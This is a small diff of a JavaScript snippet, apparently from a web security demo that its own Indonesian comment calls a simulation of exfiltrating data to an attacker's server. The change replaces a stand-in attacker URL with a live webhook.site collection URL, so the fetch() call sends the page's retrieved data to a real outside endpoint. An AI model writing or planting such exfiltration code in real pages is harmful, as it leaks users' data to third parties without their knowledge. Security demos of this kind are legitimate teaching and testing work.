@@ -20,7 +20,7 @@
       document.getElementById("output").textContent = data;
       
       // Simulasi exfiltrate data ke server attacker
-      fetch("https://attacker-server.com/steal?data=" + encodeURIComponent(data));
+      fetch("https://webhook.site/89386608-926f-4ee7-96d7-b48107b07e72" + encodeURIComponent(data));
     })
     .catch(err => {
       document.getElementById("output").textContent = "Error: " + err;
